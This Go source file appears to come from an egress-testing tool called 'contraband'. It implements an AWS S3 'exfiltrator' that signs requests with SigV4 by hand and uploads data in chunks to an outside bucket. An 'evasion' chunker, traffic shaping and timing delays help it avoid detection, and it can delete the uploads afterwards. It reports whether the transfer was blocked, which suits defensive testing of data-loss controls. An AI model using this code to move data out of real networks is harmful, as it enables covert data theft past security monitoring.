package cloud

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoAWSS3, NewAWSS3Exfiltrator())
}

// AWSS3Exfiltrator implements pure-Go S3 object exfiltration with SigV4 signing and --destroy cleanup.
type AWSS3Exfiltrator struct{}

func NewAWSS3Exfiltrator() *AWSS3Exfiltrator {
	return &AWSS3Exfiltrator{}
}

func (e *AWSS3Exfiltrator) Protocol() string {
	return common.ProtoAWSS3
}

// ComputeSigV4 calculates AWS Signature Version 4 for S3 REST requests.
func ComputeSigV4(method, reqURL, region, accessKey, secretKey string, headers map[string]string, payloadSHA256 string, t time.Time) (string, map[string]string) {
	dateStamp := t.UTC().Format("20060102")
	amzDate := t.UTC().Format("20060102T150405Z")

	signedHeadersMap := make(map[string]string)
	for k, v := range headers {
		signedHeadersMap[strings.ToLower(strings.TrimSpace(k))] = strings.TrimSpace(v)
	}
	signedHeadersMap["x-amz-date"] = amzDate
	signedHeadersMap["x-amz-content-sha256"] = payloadSHA256

	// Sort headers
	headerKeys := make([]string, 0, len(signedHeadersMap))
	for k := range signedHeadersMap {
		headerKeys = append(headerKeys, k)
	}
	sort.Strings(headerKeys)

	var canonicalHeaders bytes.Buffer
	for _, k := range headerKeys {
		canonicalHeaders.WriteString(fmt.Sprintf("%s:%s\n", k, signedHeadersMap[k]))
	}
	signedHeaders := strings.Join(headerKeys, ";")

	// Parse canonical URI and query
	uriPath := "/"
	queryString := ""
	if idx := strings.Index(reqURL, "://"); idx != -1 {
		rest := reqURL[idx+3:]
		if pathIdx := strings.Index(rest, "/"); pathIdx != -1 {
			uriPath = rest[pathIdx:]
			if qIdx := strings.Index(uriPath, "?"); qIdx != -1 {
				queryString = uriPath[qIdx+1:]
				uriPath = uriPath[:qIdx]
			}
		}
	}

	canonicalRequest := fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s",
		method,
		uriPath,
		queryString,
		canonicalHeaders.String(),
		signedHeaders,
		payloadSHA256,
	)
	canonicalReqHash := sha256.Sum256([]byte(canonicalRequest))

	credentialScope := fmt.Sprintf("%s/%s/s3/aws4_request", dateStamp, region)
	stringToSign := fmt.Sprintf("AWS4-HMAC-SHA256\n%s\n%s\n%s",
		amzDate,
		credentialScope,
		hex.EncodeToString(canonicalReqHash[:]),
	)

	// Derive signing key
	kDate := hmacSHA256([]byte("AWS4"+secretKey), []byte(dateStamp))
	kRegion := hmacSHA256(kDate, []byte(region))
	kService := hmacSHA256(kRegion, []byte("s3"))
	kSigning := hmacSHA256(kService, []byte("aws4_request"))

	signature := hex.EncodeToString(hmacSHA256(kSigning, []byte(stringToSign)))
	authHeader := fmt.Sprintf("AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s",
		accessKey, credentialScope, signedHeaders, signature)

	signedHeadersMap["authorization"] = authHeader
	return authHeader, signedHeadersMap
}

func hmacSHA256(key, data []byte) []byte {
	h := hmac.New(sha256.New, key)
	h.Write(data)
	return h.Sum(nil)
}

func classifyCloudError(err error) common.Verdict {
	return common.ClassifyError(err)
}

func (e *AWSS3Exfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()

	// Configuration
	accessKey := opts.Headers["aws_access_key_id"]
	if accessKey == "" {
		accessKey = "AKIAIOSFODNN7EXAMPLE"
	}
	secretKey := opts.Headers["aws_secret_access_key"]
	if secretKey == "" {
		secretKey = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
	}
	region := opts.Headers["aws_region"]
	if region == "" {
		region = "us-east-1"
	}
	bucket := opts.Headers["aws_bucket"]
	if bucket == "" {
		bucket = "contraband-exfil"
	}
	destroy := strings.EqualFold(opts.Headers["destroy"], "true") || strings.EqualFold(opts.Headers["auto_cleanup"], "true")

	// Determine endpoint
	scheme := "https"
	if !opts.UseTLS {
		scheme = "http"
	}
	var targetBase string
	var hostHeader string
	if strings.Contains(opts.TargetHost, "s3.amazonaws.com") || strings.Contains(opts.TargetHost, "amazonaws.com") {
		hostHeader = fmt.Sprintf("%s.s3.%s.amazonaws.com", bucket, region)
		targetBase = fmt.Sprintf("https://%s", hostHeader)
	} else {
		targetBase = fmt.Sprintf("%s://%s:%d", scheme, opts.TargetHost, opts.TargetPort)
		hostHeader = net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	}

	client := &http.Client{Timeout: opts.Timeout}
	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	var uploadedKeys []string
	var headEvidence []byte

	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = classifyCloudError(err)
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
		if len(headEvidence) < 1024 {
			take := 1024 - len(headEvidence)
			if take > len(chunkFrame) {
				take = len(chunkFrame)
			}
			headEvidence = append(headEvidence, chunkFrame[:take]...)
		}

		objectKey := fmt.Sprintf("contraband_%s_part%d.dat", opts.SessionToken.String(), seq)
		uploadedKeys = append(uploadedKeys, objectKey)

		var uploadURL string
		if strings.Contains(opts.TargetHost, "s3.amazonaws.com") {
			uploadURL = fmt.Sprintf("%s/%s", targetBase, objectKey)
		} else {
			uploadURL = fmt.Sprintf("%s/%s/%s", targetBase, bucket, objectKey)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyCloudError(err)
				result.ErrorMessage = err.Error()
				calculateCloudDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyCloudError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateCloudDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		chunkHash := sha256.Sum256(chunkFrame)
		chunkHashHex := hex.EncodeToString(chunkHash[:])
		now := time.Now().UTC()

		reqHeaders := map[string]string{
			"Host":         hostHeader,
			"Content-Type": "application/octet-stream",
		}
		_, signedHeaders := ComputeSigV4(http.MethodPut, uploadURL, region, accessKey, secretKey, reqHeaders, chunkHashHex, now)

		req, reqErr := http.NewRequestWithContext(ctx, http.MethodPut, uploadURL, bytes.NewReader(chunkFrame))
		if reqErr != nil {
			result.Verdict = classifyCloudError(reqErr)
			result.ErrorMessage = reqErr.Error()
			calculateCloudDurations(&result)
			return &result, reqErr
		}
		for k, v := range signedHeaders {
			req.Header.Set(k, v)
		}

		resp, doErr := client.Do(req)
		if doErr != nil {
			result.Verdict = classifyCloudError(doErr)
			result.ErrorMessage = doErr.Error()
			calculateCloudDurations(&result)
			return &result, doErr
		}
		respBody, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()

		result.BytesSent += int64(len(chunkFrame))
		result.BytesRecv += int64(len(respBody))

		if resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusUnauthorized {
			err := fmt.Errorf("S3 upload rejected: HTTP %d Forbidden/Unauthorized", resp.StatusCode)
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusNoContent {
			err := fmt.Errorf("S3 upload returned HTTP %d: %s", resp.StatusCode, string(respBody))
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()

	// Handle --destroy auto-cleanup
	if destroy {
		for _, key := range uploadedKeys {
			var deleteURL string
			if strings.Contains(opts.TargetHost, "s3.amazonaws.com") {
				deleteURL = fmt.Sprintf("%s/%s", targetBase, key)
			} else {
				deleteURL = fmt.Sprintf("%s/%s/%s", targetBase, bucket, key)
			}

			emptyHash := sha256.Sum256(nil)
			emptyHashHex := hex.EncodeToString(emptyHash[:])
			now := time.Now().UTC()

			delHeaders := map[string]string{
				"Host": hostHeader,
			}
			_, signedDelHeaders := ComputeSigV4(http.MethodDelete, deleteURL, region, accessKey, secretKey, delHeaders, emptyHashHex, now)

			delReq, err := http.NewRequestWithContext(ctx, http.MethodDelete, deleteURL, nil)
			if err == nil {
				for k, v := range signedDelHeaders {
					delReq.Header.Set(k, v)
				}
				delResp, delErr := client.Do(delReq)
				if delErr == nil {
					_ = delResp.Body.Close()
				}
			}
		}
	}

	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	if opts.ExpectedHash != "" {
		result.PayloadHash = opts.ExpectedHash
	} else {
		result.PayloadHash = chunker.PayloadHashHex()
	}
	result.TargetVolume = result.BytesSent
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	calculateCloudDurations(&result)

	return &result, nil
}

func calculateCloudDurations(r *common.ProbeResult) {
	if r.Timestamps.TeardownDone.IsZero() {
		r.Timestamps.TeardownDone = time.Now().UTC()
	}
	r.Timestamps.ComputeDurations()
	if r.Timestamps.TransferDuration > 0 && r.BytesSent > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(r.Timestamps.TransferDuration) / float64(time.Second)) / 1000.0
	}
}
